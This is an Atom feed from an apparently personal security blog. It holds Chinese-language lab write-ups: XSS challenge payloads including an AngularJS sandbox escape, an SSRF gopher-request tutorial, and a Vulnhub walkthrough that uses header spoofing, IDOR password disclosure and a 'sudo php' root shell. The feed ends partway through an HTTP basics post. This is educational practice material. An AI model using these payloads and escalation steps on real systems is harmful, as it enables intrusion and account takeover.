<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4CH4N ZKUAN</title>
  
  <subtitle>透过现象看本质</subtitle>
  <link href="https://whoiszkuan.github.io/atom.xml" rel="self"/>
  
  <link href="https://whoiszkuan.github.io/"/>
  <updated>2021-11-04T09:02:39.048Z</updated>
  <id>https://whoiszkuan.github.io/</id>
  
  <author>
    <name>zkuan</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>N1BOOK-XSS</title>
    <link href="https://whoiszkuan.github.io/2021/11/04/N1BOOK-XSS/"/>
    <id>https://whoiszkuan.github.io/2021/11/04/N1BOOK-XSS/</id>
    <published>2021-11-04T08:58:37.000Z</published>
    <updated>2021-11-04T09:02:39.048Z</updated>
    
    <content type="html"><![CDATA[<h1 id="N1BOOK-XSS"><a href="#N1BOOK-XSS" class="headerlink" title="N1BOOK-XSS"></a>N1BOOK-XSS</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>直接构造payload看网页反应</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>传入参数：<code>username=&lt;script&gt;alert()&lt;/script&gt;</code></p><p>审计源代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    location<span class="token punctuation">.</span>search <span class="token operator">=</span> <span class="token string">"?username=xss"</span>    <span class="token punctuation">}</span>    <span class="token keyword">var</span> username <span class="token operator">=</span> <span class="token string">'&lt;script&gt;alert(/xss/)&lt;/script&gt;'</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token string">"Welcome "</span> <span class="token operator">+</span> <span class="token function">escape</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>escape()函数对字符串进行了编码</p></blockquote><p>发现<code>&lt;script&gt;alert()&lt;/script&gt;</code>被username用单引号包裹，尝试闭合，并将后面的单引号注释掉。</p><p>写入payload：<code>username=';alert();//</code></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>传入参数：<code>username=&lt;script&gt;alert()&lt;/script&gt;</code></p><p>审计源代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    location<span class="token punctuation">.</span>search <span class="token operator">=</span> <span class="token string">"?username=xss"</span>    <span class="token punctuation">}</span>    <span class="token keyword">var</span> username <span class="token operator">=</span> <span class="token string">'&lt;script&gt;alert()&lt;/script&gt;'</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token string">"Welcome "</span> <span class="token operator">+</span> username<span class="token punctuation">;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload被包裹，尝试闭合：<code>var username = '\';alert();';</code></p><p>单引号被转义，尝试两个单引号：<code>'';alert();//</code></p><p>闭合成功：<code>var username = '\'';alert();//';</code></p><h4 id="还有另外一种方法"><a href="#还有另外一种方法" class="headerlink" title="还有另外一种方法"></a>还有另外一种方法</h4><p>写入<code>&lt;img&gt;</code>标签，<code>alert()</code>用onclick等以<strong>on</strong>开头的事件表示。</p><p>payload：<code>&lt;img src=1 onclick=alert();&gt;</code></p><p><code>on</code>事件概览：</p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/incident.jpeg"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>查看源代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>    <span class="token keyword">var</span> time <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> jumpUrl<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'jumpUrl'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    jumpUrl <span class="token operator">=</span> location<span class="token punctuation">.</span>href<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    jumpUrl <span class="token operator">=</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'jumpUrl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>jump<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">jump</span><span class="token punctuation">(</span><span class="token parameter">time</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>time <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    location<span class="token punctuation">.</span>href <span class="token operator">=</span> jumpUrl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    time <span class="token operator">=</span> time <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">页面</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>time<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">秒后将会重定向到</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">escape</span><span class="token punctuation">(</span>jumpUrl<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>jump<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token parameter">variable</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>       <span class="token punctuation">}</span>       <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>XSS 伪链接</p><p><code>javascript:alert(/xss/)</code>并不会定向到其他页面，而是在当前页面执行<code>alert(/xss/)</code>。</p><h3 id="windows-location属性"><a href="#windows-location属性" class="headerlink" title="windows.location属性"></a><strong>windows.location</strong>属性</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>hash</td><td>设置或返回从#开始的URL（锚）</td></tr><tr><td>host</td><td>设置或返回主机名和当前URL的端口号</td></tr><tr><td>hostname</td><td>设置或返回当前URL的主机名</td></tr><tr><td>href</td><td>设置或返回完整的URL</td></tr><tr><td>pathname</td><td>设置或返回当前URL的路径部分</td></tr><tr><td>port</td><td>设置或返回当前URL的端口号</td></tr><tr><td>protocol</td><td>设置或返回当前URL的协议</td></tr><tr><td>search</td><td>设置或返回从?开始的URL（查询部分）</td></tr></tbody></table><p><code>function getQueryVariable()</code>中的<code>window.location.search.substring(1);</code>表示了返回从<code>?</code>开始的URL</p><p><code>jumpUrl</code>为注入点，构造payload：<code>http://127.0.0.1:3000/level3?jumpUrl=javascript:alert();</code></p><p>注入成功。</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>审计代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'autosubmit'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> autoForm <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'autoForm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    autoForm<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token operator">?</span> location<span class="token punctuation">.</span>href <span class="token operator">:</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    autoForm<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token parameter">variable</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>       <span class="token punctuation">}</span>       <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>getQueryVariable('autosubmit') !== false</code>其中<code>autosubmit</code>不能为false，需要传入值使其为true；<code>getQueryVariable('action') == false</code>其中<code>action</code>不能为false。参数之间用<code>&amp;</code>连接。</p><p>构造payload：<code>?autosubmit=1&amp;action=javascript:alert(/xss/)</code></p><p>注入成功。</p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p><strong>涉及到模板注入AngularJS沙箱逃逸</strong>。</p><p>常规插入payload<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>及各种绕过方式都无法注入</p><p>查看网页源代码</p><p><code>&lt;script src="https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js"&gt;&lt;/script&gt;</code></p><p>引用了AngularJS框架。</p><p>尝试<code>username={{2*2}}</code></p><p>得到返回值<strong>4</strong>，花括号中的表达式被执行了，意味着服务器允许用户在花括号中传入命令参数，可以实现模板注入攻击。</p><p>根据Wappalyzer判断，AngularJS版本为<code>1.4.6</code></p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/xssJS.png"></p><p>AngularJS 1.6 版本之前有Angular沙箱，利用沙箱逃逸技术进行XSS攻击。</p><p><strong>AngularJS沙箱逃逸：</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>charAt<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">;</span>  <span class="token comment">//'a'.构造函数.原型.charAt</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'x=1}}};alert(1)//'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过覆盖原生函数charAt，可以绕过Angular表达式的沙箱且执行<code>alert(1)</code></p><p>因此构造payload：</p><p><code>?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</code></p><p>注入成功。</p><p>关于AngularJS沙箱逃逸的技术分析：</p><p><a href="https://github.com/rwinch/angularjs-escaping-expression-sandbox">https://github.com/rwinch/angularjs-escaping-expression-sandbox</a></p><p><a href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs">https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs</a></p><p><a href="https://xz.aliyun.com/t/4638">https://xz.aliyun.com/t/4638</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;N1BOOK-XSS&quot;&gt;&lt;a href=&quot;#N1BOOK-XSS&quot; class=&quot;headerlink&quot; title=&quot;N1BOOK-XSS&quot;&gt;&lt;/a&gt;N1BOOK-XSS&lt;/h1&gt;&lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Web" scheme="https://whoiszkuan.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SSRF-Gopher</title>
    <link href="https://whoiszkuan.github.io/2021/10/31/SSRF-Gopher/"/>
    <id>https://whoiszkuan.github.io/2021/10/31/SSRF-Gopher/</id>
    <published>2021-10-31T06:37:46.000Z</published>
    <updated>2021-10-31T12:27:10.256Z</updated>
    
    <content type="html"><![CDATA[<h1 id="What-is-Gopher"><a href="#What-is-Gopher" class="headerlink" title="What is Gopher?"></a>What is Gopher?</h1><h2 id="初识Gopher"><a href="#初识Gopher" class="headerlink" title="初识Gopher"></a>初识Gopher</h2><p>​    在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用<strong>tcp70端口</strong>。</p><p>​    Gopher协议支持发出GET和POST请求：可以先截获GET请求包和POST请求包，再构成符合Gopher协议的请求。Gopher协议是SSRF利用中最强大的协议。</p><p><strong>限制</strong>：</p><table><thead><tr><th align="center">协议</th><th align="center">PHP</th><th align="center">Java</th><th align="center">Curl</th><th align="center">Perl</th><th align="center">ASP.NET</th></tr></thead><tbody><tr><td align="center">Gopher</td><td align="center">–wite-curlwrappers且php版本至少为5.3</td><td align="center">小于JDK1.7</td><td align="center">低版本不支持</td><td align="center">支持</td><td align="center">小于版本3</td></tr></tbody></table><blockquote><p>–wite-curlwrappers:运用curl工具打开url流</p><p>curl使用curl –version查看版本以及支持的协议</p></blockquote><p>Gopher协议格式</p><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></p><ul><li>Gopher默认端口是70</li><li>如果发起POST请求，回车换行需要使用<code>%0d%0a</code>，如果多个参数，参数之间的&amp;也需要进行URL编码</li></ul><hr><h2 id="Gopher-HTTP"><a href="#Gopher-HTTP" class="headerlink" title="Gopher HTTP"></a>Gopher HTTP</h2><p>Gopher发送HTTP数据步骤：</p><ol><li>构造HTTP数据包</li><li>URL编码、替换回车换行为<code>%0d%0a</code></li><li>发送Gopher协议</li></ol><h3 id="GET型HTTP"><a href="#GET型HTTP" class="headerlink" title="GET型HTTP"></a>GET型HTTP</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /ssrf/base/get.php?name=zkuan HTTP/1.1Host:192.168.1.111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>URL编码后使用curl发送HTTP包：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">curl gopher://192.168.1.122/_GET%20/ssrf/base/get.php%3fname=zkuan%20HTTP/1.1%0d%0aHost:192.168.1.111%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="POST型HTTP"><a href="#POST型HTTP" class="headerlink" title="POST型HTTP"></a>POST型HTTP</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /ssrf/base/post.php HTTP/1.1Host:192.168.1.111Content-Type:application/x-www-form-urlencodedContent-Length:11name=zkuan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>URL编码后使用curl发送HTTP包：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">curl gopher://192.168.1.122/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0aHost:192.168.1.111%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:11%0d%0a%0d%0aname=zkuan%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;What-is-Gopher&quot;&gt;&lt;a href=&quot;#What-is-Gopher&quot; class=&quot;headerlink&quot; title=&quot;What is Gopher?&quot;&gt;&lt;/a&gt;What is Gopher?&lt;/h1&gt;&lt;h2 id=&quot;初识Gopher&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Web" scheme="https://whoiszkuan.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub Me And My Girlfriend</title>
    <link href="https://whoiszkuan.github.io/2021/10/01/Vulnhub-Me-And-My-Girlfriend/"/>
    <id>https://whoiszkuan.github.io/2021/10/01/Vulnhub-Me-And-My-Girlfriend/</id>
    <published>2021-10-01T06:07:54.000Z</published>
    <updated>2021-10-31T08:44:23.692Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Me-And-My-Girlfriend-1"><a href="#Me-And-My-Girlfriend-1" class="headerlink" title="Me And My Girlfriend:1"></a>Me And My Girlfriend:1</h1><p>渗透准备：</p><ol><li>主机：Kali 2021.2</li><li>靶机：Vmware </li><li>靶机IP段：192.168.158.*</li><li>Http信息头知识</li><li>Linux操作基础</li></ol><h2 id="靶机背景"><a href="#靶机背景" class="headerlink" title="靶机背景"></a>靶机背景</h2><p>难易度：简单</p><p>靶机镜下载地址:<a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/</a></p><p>背景：This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, “Ceban Corp”, something has changed from Alice’s attitude towards Bob like something is “hidden”, And Bob asks for your help to get what Alice is hiding and get full access to the company!</p><p>大致意思就是男主Bob怀疑女主Alice出轨了，让我们潜入Alice公司内部查看Alice的电脑线索。</p><h2 id="开启靶机，扫描目标主机IP段"><a href="#开启靶机，扫描目标主机IP段" class="headerlink" title="开启靶机，扫描目标主机IP段"></a>开启靶机，扫描目标主机IP段</h2><p><code>nmap -sP 192.168.158.0/24</code></p><p>检测出靶机IP为<code>192.168.158.128</code></p><p><img src="/images/mamg1.png"></p><h2 id="扫描靶机信息"><a href="#扫描靶机信息" class="headerlink" title="扫描靶机信息"></a>扫描靶机信息</h2><p>nmap基础用法：<code>-A 版本检测 -O 检测OS版本 -sV 服务探测/版本信息</code></p><p><code>nmap -A -O -sV 192.168.158.128</code></p><p><img src="/images/mamg2.png"></p><p>得出靶机开放了<code>ssh:22</code>和<code>http:80</code>服务</p><h2 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h2><p>访问80端口发现无法正常进入网页</p><p><img src="/images/mamg3.png"></p><p>翻译过来意思是：只能通过本地IP访问</p><p>打开网页源代码看看有没有什么提示：</p><p><img src="/images/mamg4.png"></p><p>提示使用<strong>X-FORWARDED-FOR</strong>访问网页</p><p><code>X-Forwarded-For用来获取最初发起请求的IP</code></p><p>综上所述：我们需要使用X-Forwarded-For伪造一个本地IP为最初发起请求访问靶机80端口</p><h2 id="X-Forwarded-FOR"><a href="#X-Forwarded-FOR" class="headerlink" title="X-Forwarded-FOR"></a>X-Forwarded-FOR</h2><p>已知本地IP地址为<strong>127.0.0.1</strong></p><p>使用X-Forwarded-For Header伪造IP</p><p><img src="/images/xfw.png"></p><p>成功登录</p><p><img src="/images/mamg5.png"></p><p>页面有4个选项，分别为 主页、登录、注册、关于。</p><p>先随便注册一个帐号登录</p><p><img src="/images/mamg6.png"></p><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>登录进去之后对我们最有用的是Profile选项</p><p>这是一个更改密码的选项</p><p>在网址栏上发现了一点端倪</p><p><code>?</code>后面跟随的是参数<code>page=profile&amp;user_id=12</code>，请求了<code>profile</code>页面，用户id为<code>12</code></p><p>尝试修改Id</p><p><img src="/images/mamg7.png"></p><p>可以看到回显出了其他用户的帐号和密码</p><p>如果获得了帐号和密码就可以尝试登录22端口的ssh服务</p><p>那么密码该如何获得</p><p><code>html中设置输入文本隐藏明文的操作为type="password",在审查代码中修改type类型为type="text",可查看用户输入的密码。</code></p><p><img src="/images/mamg8.png"></p><p><img src="/images/mamg9.png"></p><p>得出用户密码。</p><p>遍历所有用户id后锁定Bob女友Alice的账户密码为<code>alice:4lic3</code></p><h2 id="SSH访问"><a href="#SSH访问" class="headerlink" title="SSH访问"></a>SSH访问</h2><p>得到Alice的账户和密码后，使用ssh访问靶机电脑</p><p><code>ssh alice@192.168.158.128</code></p><p><img src="/images/mamg10.png"></p><h2 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag 1"></a>Flag 1</h2><p>列出当前文件夹所有文件，包括隐藏文件</p><p><img src="/images/mamg11.png"></p><p>发现文件夹下有一个隐藏文件夹</p><p><img src="/images/mamg12.png"></p><p><img src="/images/mamg13.png"></p><p>进入后发现有<code>flag1.txt</code>文件</p><p>成功获取flag1</p><p><code>Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}</code></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>尝试<code>sudo su</code>无法提权</p><p>查看Alice当前权限</p><p><img src="/images/mamg14.png"></p><p><code>(root)NOPASSWD:/usr/bin/php</code>发现可以不使用密码打开php文件</p><p><a href="https://gtfobins.github.io/">基础提权</a></p><p>尝试回调php提权</p><pre class="line-numbers language-none"><code class="language-none">CMD="/bin/sh"sudo php -r "system('$CMD');"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/mamg15.png"></p><p>成功回调root</p><h2 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h2><p>查找flag文件</p><p><img src="/images/mamg16.png"></p><p>进入<code>/root</code>文件夹以后，发现<code>flag2.txt</code>文件</p><p><img src="/images/mamg17.png"></p><p>成功拿下flag2</p><blockquote><p> Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Me-And-My-Girlfriend-1&quot;&gt;&lt;a href=&quot;#Me-And-My-Girlfriend-1&quot; class=&quot;headerlink&quot; title=&quot;Me And My Girlfriend:1&quot;&gt;&lt;/a&gt;Me And My Girlfriend</summary>
      
    
    
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Penetration Testing" scheme="https://whoiszkuan.github.io/tags/Penetration-Testing/"/>
    
  </entry>
  
  <entry>
    <title>Http Agreement</title>
    <link href="https://whoiszkuan.github.io/2021/09/10/Http%20Agreement/"/>
    <id>https://whoiszkuan.github.io/2021/09/10/Http%20Agreement/</id>
    <published>2021-09-10T11:39:28.000Z</published>
    <updated>2021-10-31T08:45:18.556Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>服务器和客户端进行数据交互的一种形式。</p><h2 id="常用请求头信息"><a href="#常用请求头信息" class="headerlink" title="常用请求头信息"></a>常用请求头信息</h2><ul><li>User-Agent：请求载体的身份标识。</li><li>Connection：请求完毕后，是断开连接还是保持连接。</li></ul><h2 id="常用响应头信息"><a href="#常用响应头信息" class="headerlink" title="常用响应头信息"></a>常用响应头信息</h2><ul><li>Content-Type：服务器响应回客户端的数据类型。</li></ul><h2 id="https协议-Hyper-Text-Transfer-Protocol"><a href="#https协议-Hyper-Text-Transfer-Protocol" class="headerlink" title="https协议(Hyper Text Transfer Protocol)"></a>https协议(Hyper Text Transfer Protocol)</h2><ul><li>安全的超文本传输协议</li></ul><h2 id="加密方式"><a href="#加密方式" class="headerlink" title="加密方式"></a>加密方式</h2><ul><li>对称密钥加密</li><li>非对称密钥加密</li><li>证书密钥加密(https)</li></ul><h3 id="对称密钥加密"><a href="#对称密钥加密" class="headerlink" title="对称密钥加密"></a>对称密钥加密</h3><ul><li><p>客户端向服务器发送一条信息，首先客户端会采用已知的算法对信息进行加密，比如MD5或者Base64加密，接收端对加密的信息进行解密的时候需要用到密钥，中间会传递密钥，（加密和解密的密钥是同一个），密钥在传输中间是被加密。</p><p><strong>有潜在的危险，一旦被窃听，或者信息被挟持，就有可能破解密钥，而破解其中的信息。因此“共享密钥加密”这种方式存在安全隐患。</strong></p></li></ul><p><img src="/images/https-key1.png"></p><h3 id="非对称密钥加密"><a href="#非对称密钥加密" class="headerlink" 